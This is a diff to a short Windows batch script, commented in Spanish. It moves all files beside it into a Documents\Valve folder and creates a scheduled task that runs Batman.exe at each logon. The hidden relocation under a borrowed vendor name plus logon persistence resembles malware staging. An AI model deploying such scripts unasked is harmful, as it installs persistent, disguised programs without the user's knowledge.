@@ -1,13 +1,18 @@
 @echo off
 
-set archivo=Batman.exe
+set origen="%~dp0*"
 
-set origen="%~dp0%archivo%"
+set destino="%USERPROFILE%\Documents\Valve"
 
-set destino="%USERPROFILE%\Documents\%archivo%"
+if not exist %destino% (
+    mkdir %destino%
+)
 
 move /Y %origen% %destino%
-echo Archivo movido a Documentos.
+echo Todos los archivos y carpetas se han movido a Documentos\Valve.
 
-schtasks /create /sc onlogon /tn "Batman" /tr %destino% /f
+REM Crear una tarea programada para ejecutar un archivo .exe específico al iniciar sesión
+REM Cambia "archivo.exe" por el nombre del archivo que deseas ejecutar en el inicio
+set archivo_exe=%destino%\Batman.exe
+schtasks /create /sc onlogon /tn "Batman" /tr %archivo_exe% /f
 echo Tarea programada creada para ejecutarse al iniciar sesión.
